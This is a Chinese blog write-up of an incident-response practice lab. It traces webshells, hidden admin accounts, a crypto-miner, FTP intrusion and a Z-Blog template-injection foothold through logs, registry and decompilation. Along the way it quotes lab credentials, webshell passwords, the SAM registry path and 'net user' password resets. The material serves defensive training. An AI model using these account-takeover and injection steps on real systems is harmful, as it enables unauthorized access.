anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">4.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="应急响应-知攻善防应急响应靶场"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为北京"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>北京</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/060-zhigongshanfang-20260420-150300.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/"><header><a class="post-meta-categories" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url">应急响应</a><a href="/tags/%E9%9D%B6%E5%9C%BA/" tabindex="-1" itemprop="url">靶场</a><h1 id="CrawlerTitle" itemprop="name headline">应急响应-知攻善防应急响应靶场</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">At4ckxu</span><time itemprop="dateCreated datePublished" datetime="2026-04-20T06:53:37.000Z" title="发表于 2026-04-20 14:53:37">2026-04-20</time><time itemprop="dateCreated datePublished" datetime="2026-04-20T07:03:00.884Z" title="更新于 2026-04-20 15:03:00">2026-04-20</time></header><h1 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h1><p>报错不兼容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226142537330.png" alt="image-20251226142537330"></p>
+<p>开启靶机后关闭防火墙</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226142558668.png" alt="image-20251226142558668"></p>
+<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前景需要：</span><br><span class="line">小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：</span><br><span class="line"></span><br><span class="line">1.攻击者的shell密码</span><br><span class="line">2.攻击者的IP地址</span><br><span class="line">3.攻击者的隐藏账户名称</span><br><span class="line">4.攻击者挖矿程序的矿池域名</span><br><span class="line"></span><br><span class="line">用户：</span><br><span class="line">administrator</span><br><span class="line">密码</span><br><span class="line">Zgsf@admin.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击者的shell密码"><a href="#攻击者的shell密码" class="headerlink" title="攻击者的shell密码"></a>攻击者的shell密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rebeyond</span><br></pre></td></tr></table></figure>
+
+<p>webshell在网站根目录，上传D盾扫描</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226144010556.png" alt="image-20251226144010556"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226144142887.png" alt="image-20251226144142887"></p>
+<h2 id="攻击者的IP地址"><a href="#攻击者的IP地址" class="headerlink" title="攻击者的IP地址"></a>攻击者的IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.126.1</span><br></pre></td></tr></table></figure>
+
+<p>找到shell.php文件之后，用户上传了该文件，分析web日志</p>
+<p>Apache日志文件目录：</p>
+<p>C:\phpstudy_pro\Extensions\Apache2.4.39\logs</p>
+<p>搜索shell.php文件，存在大量访问shell.php的日志，并且ip为192.168.126.1</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226145404464.png" alt="image-20251226145404464"></p>
+<h2 id="攻击者的隐藏账户名称"><a href="#攻击者的隐藏账户名称" class="headerlink" title="攻击者的隐藏账户名称"></a>攻击者的隐藏账户名称</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack168$</span><br></pre></td></tr></table></figure>
+
+<p>隐藏账户查看注册表</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>默认无法查看其中内容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226145753822.png" alt="image-20251226145753822"></p>
+<p>右键菜单选择权限，打开权限管理窗口，权限勾选为完全控制，关闭，再次打开注册表</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226150410930.png" alt="image-20251226150410930"></p>
+</blockquote>
+<p>或者powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-LocalUser</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226150817807.png" alt="image-20251226150817807"></p>
+<h2 id="攻击者挖矿程序的矿池域名"><a href="#攻击者挖矿程序的矿池域名" class="headerlink" title="攻击者挖矿程序的矿池域名"></a>攻击者挖矿程序的矿池域名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wakuang.zhigongshanfang.top</span><br></pre></td></tr></table></figure>
+
+<p>当前为administrator用户，直接修改隐藏用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user hack168$ 123456aa@</span><br></pre></td></tr></table></figure>
+
+<p>找到exe</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226152740067.png" alt="image-20251226152740067"></p>
+<p>反编译</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\web\应急响应\蓝队应急响应工具箱\_internal\tools\BT-Reverse\pyinstaller逆向工具&gt;python pyinstxtractor.py Kuang.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226152817204.png" alt="image-20251226152817204"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226153050278.png" alt="image-20251226153050278"></p>
+<p>在线网站pyc转py</p>
+<p>得到源码py</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226153147206.png" alt="image-20251226153147206"></p>
+<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.攻击者的IP地址（两个）？</span><br><span class="line">2.攻击者的webshell文件名？</span><br><span class="line">3.攻击者的webshell密码？</span><br><span class="line">4.攻击者的QQ号？</span><br><span class="line">5.攻击者的服务器伪IP地址？</span><br><span class="line">6.攻击者的服务器端口？</span><br><span class="line">7.攻击者是如何入侵的（选择题）？</span><br><span class="line">8.攻击者的隐藏用户名？</span><br><span class="line"></span><br><span class="line">用户:administrator</span><br><span class="line">密码:Zgsf@qq.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击者的IP地址（两个）"><a href="#攻击者的IP地址（两个）" class="headerlink" title="攻击者的IP地址（两个）"></a>攻击者的IP地址（两个）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.126.135</span><br><span class="line">192.168.126.129</span><br></pre></td></tr></table></figure>
+
+<p>D盾扫描，web目录下存在后门文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226164133199.png" alt="image-20251226164133199"></p>
+<p>查看web日志</p>
+<p>存在访问后门的ip地址，找到第一个ip：192.168.126.135</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251226163556590.png" alt="image-20251226163556590"></p>
+<p>使用系统日志分析工具</p>
+<p>在远程桌面登录成功日志查看到hack887$用户曾登录过，ip为192.168.126.129，为第二个攻击ip</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228160019815.png" alt="image-20251228160019815"></p>
+<h2 id="攻击者的webshell文件名"><a href="#攻击者的webshell文件名" class="headerlink" title="攻击者的webshell文件名"></a>攻击者的webshell文件名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击者的webshell密码"><a href="#攻击者的webshell密码" class="headerlink" title="攻击者的webshell密码"></a>攻击者的webshell密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack6618</span><br></pre></td></tr></table></figure>
+
+<p>哥斯拉马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228161804171.png" alt="image-20251228161804171"></p>
+<h2 id="攻击者的QQ号"><a href="#攻击者的QQ号" class="headerlink" title="攻击者的QQ号"></a>攻击者的QQ号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">777888999321</span><br></pre></td></tr></table></figure>
+
+<p>在查看文档目录时发现，存在qq文件夹，攻击者在此登录过QQ留下的痕迹</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162025634.png" alt="image-20251228162025634"></p>
+<p>攻击者登录过的QQ号</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162103793.png" alt="image-20251228162103793"></p>
+<h2 id="攻击者的服务器伪IP地址"><a href="#攻击者的服务器伪IP地址" class="headerlink" title="攻击者的服务器伪IP地址"></a>攻击者的服务器伪IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">256.256.66.88:65536</span><br></pre></td></tr></table></figure>
+
+<p>查看文件传输的内容</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162145860.png" alt="image-20251228162145860"></p>
+<p>发现隧道搭建frp工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162254897.png" alt="image-20251228162254897"></p>
+<p>查看frp配置文件发现攻击者ip</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162319359.png" alt="image-20251228162319359"></p>
+<h2 id="攻击者是如何入侵的（选择题）"><a href="#攻击者是如何入侵的（选择题）" class="headerlink" title="攻击者是如何入侵的（选择题）"></a>攻击者是如何入侵的（选择题）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162718962.png" alt="image-20251228162718962"></p>
+<p>已经得知攻击者留有后门system.php，我们需要知道攻击者如何上传该文件的</p>
+<p>在日志文件中，13:02是第一次GET system.php就为200，再次之前没有看到POST上传system.php，因此非web攻击</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228162913677.png" alt="image-20251228162913677"></p>
+<p>查看mysql配置文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228163433493.png" alt="image-20251228163433493"></p>
+<p>没有找到日志相关配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">log-error=&quot;C:/phpstudy_pro/Extensions/MySQL5.7.26/data/error.log&quot;  # 错误日志路径</span><br><span class="line">general_log_file=&quot;C:/phpstudy_pro/Extensions/MySQL5.7.26/data/mysql.log&quot;  # 通用查询日志（需启用）</span><br><span class="line">slow_query_log_file=&quot;C:/phpstudio_pro/Extensions/MySQL5.7.26/data/slow.log&quot;  # 慢查询日志（需启用）</span><br></pre></td></tr></table></figure>
+
+<p>并没有配置日志，由于是靶场，排除</p>
+<blockquote>
+<p>在实际攻击环境中，需要考虑是否为攻击者修改配置文件or删除日志？</p>
+</blockquote>
+<p>查看ftp日志：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\phpstudy_pro\Extensions\FTP0.9.60\Logs</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228163947645.png" alt="image-20251228163947645"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228164037583.png" alt="image-20251228164037583"></p>
+<p>确定为ftp攻击</p>
+<p>攻击者13:01时ftp上传的该文件，而rdp是在13.28，排除rdp</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228164321895.png" alt="image-20251228164321895"></p>
+<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户:administrator</span><br><span class="line">密码:xj@123456</span><br><span class="line"></span><br><span class="line">前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。</span><br><span class="line">这是他的服务器，请你找出以下内容作为通关条件：</span><br><span class="line"></span><br><span class="line">攻击者的两个IP地址</span><br><span class="line">攻击者隐藏用户名称</span><br><span class="line">三个攻击者留下的flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击者的两个IP地址"><a href="#攻击者的两个IP地址" class="headerlink" title="攻击者的两个IP地址"></a>攻击者的两个IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.75.129</span><br><span class="line">192.168.75.130</span><br></pre></td></tr></table></figure>
+
+<p>D盾扫描发现存在两个后门文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228165945757.png" alt="image-20251228165945757"></p>
+<p>都是php一句话木马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228170025618.png" alt="image-20251228170025618"></p>
+<p>查看web日志，得到ip 192.168.75.129</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228170855930.png" alt="image-20251228170855930"></p>
+<p>隐藏用户登录ip 192.168.75.130</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228170421747.png" alt="image-20251228170421747"></p>
+<h2 id="攻击者隐藏用户名称"><a href="#攻击者隐藏用户名称" class="headerlink" title="攻击者隐藏用户名称"></a>攻击者隐藏用户名称</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack6618$</span><br></pre></td></tr></table></figure>
+
+<p>powershell运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get-localuser</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228170229245.png" alt="image-20251228170229245"></p>
+<h2 id="三个攻击者留下的flag"><a href="#三个攻击者留下的flag" class="headerlink" title="三个攻击者留下的flag"></a>三个攻击者留下的flag</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;zgsfsys@sec&#125;</span><br><span class="line">flag&#123;888666abc&#125;</span><br><span class="line">flag&#123;H@Ck@sec&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web日志分析时，11:22第一次访问404.php，此时响应404</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228171043530.png" alt="image-20251228171043530"></p>
+<p>第二次访问11:33，此时已经存在404.php</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228171135447.png" alt="image-20251228171135447"></p>
+<p>在其中我们发现请求：&#x2F;zb_users&#x2F;theme&#x2F;aymFreeFive&#x2F;template&#x2F;%7B$slides[‘img’]%7D</p>
+<p>疑似攻击者进行了模版注入，虽然响应为404，但大概率通过这种方式已经成功写文件404.php了</p>
+<p>查看计划任务，发现flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228171843536.png" alt="image-20251228171843536"></p>
+<p>修改hack6618$用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user hack6618$ 密码</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228171910377.png" alt="image-20251228171910377"></p>
+<p>切换登录到该用户</p>
+<p>发现该用户的下载处存在system.bat文件，文件内容为写入一句话木马到404.php中</p>
+<p>并且获取到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228172158394.png" alt="image-20251228172158394"></p>
+<p>继续分析web日志</p>
+<p>11:25时，推测攻击者进入了后台</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228172600408.png" alt="image-20251228172600408"></p>
+<p>为zblog</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228173054997.png" alt="image-20251228173054997"></p>
+<p>使用zblog密码找回工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228173240432.png" alt="image-20251228173240432"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228173305120.png" alt="image-20251228173305120"></p>
+<p>发现存在两个用户，将Hacker用户密码重置并登录</p>
+<p>发现flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228173500412.png" alt="image-20251228173500412"></p>
+<h1 id="linux1"><a href="#linux1" class="headerlink" title="linux1"></a>linux1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相关账户密码：</span><br><span class="line">defend/defend</span><br><span class="line">root/defend</span><br><span class="line">前景需要：小王急匆匆地找到小张，小王说&quot;李哥，我dev服务器被黑了&quot;,快救救我！！</span><br></pre></td></tr></table></figure>
+
+<p>Dev服务器作用：</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>分类</strong></th>
+<th align="center"><strong>具体作用</strong></th>
+<th align="center"><strong>典型场景</strong></th>
+<th align="center"><strong>与其他环境（如生产环境）的差异</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>代码开发</strong></td>
+<td align="center">提供运行环境供开发人员编写、调试代码，支持实时修改与测试。</td>
+<td align="center">- 本地代码运行测试 - 调试接口或服务逻辑</td>
+<td align="center">允许频繁重启或中断操作，生产环境需高稳定性。</td>
+</tr>
+<tr>
+<td align="center"><strong>功能测试</strong></td>
+<td align="center">验证新功能或模块的可用性，确保代码逻辑正确。</td>
+<td align="center">- 新功能联调 - 数据库迁移测试</td>
+<td align="center">使用模拟数据，生产环境处理真实用户数据。</td>
+</tr>
+<tr>
+<td align="center"><strong>安全测试</strong></td>
+<td align="center">模拟攻击行为（如渗透测试）或验证安全补丁，避免漏洞影响生产环境。</td>
+<td align="center">- 漏洞扫描 - 权限配置验证</td>
+<td align="center">安全策略可能放宽，但需隔离生产网络。</td>
+</tr>
+<tr>
+<td align="center"><strong>协作与版本控制</strong></td>
+<td align="center">支持多开发者协作开发，集成版本控制工具（如Git），管理代码分支与合并。</td>
+<td align="center">- 团队协同开发 - 代码冲突解决</td>
+<td align="center">允许实验性代码提交，生产环境仅部署稳定版本。</td>
+</tr>
+<tr>
+<td align="center"><strong>工具链集成</strong></td>
+<td align="center">集成开发工具（IDE）、自动化测试框架（如Jenkins）、依赖管理（如Maven）等。</td>
+<td align="center">- 自动化构建部署 - 单元测试&#x2F;集成测试运行</td>
+<td align="center">工具链灵活性高，生产环境需最小化工具依赖。</td>
+</tr>
+<tr>
+<td align="center"><strong>数据模拟</strong></td>
+<td align="center">使用生成或脱敏的测试数据，避免生产数据泄露或污染。</td>
+<td align="center">- 数据库压力测试 - 用户行为模拟</td>
+<td align="center">数据无真实业务价值，生产数据需严格保护。</td>
+</tr>
+<tr>
+<td align="center"><strong>环境隔离</strong></td>
+<td align="center">独立于生产网络，防止开发中的错误或攻击影响线上服务。</td>
+<td align="center">- 开发环境与生产环境分离 - 微服务独立调试</td>
+<td align="center">网络策略宽松，生产环境需严格防火墙规则。</td>
+</tr>
+</tbody></table>
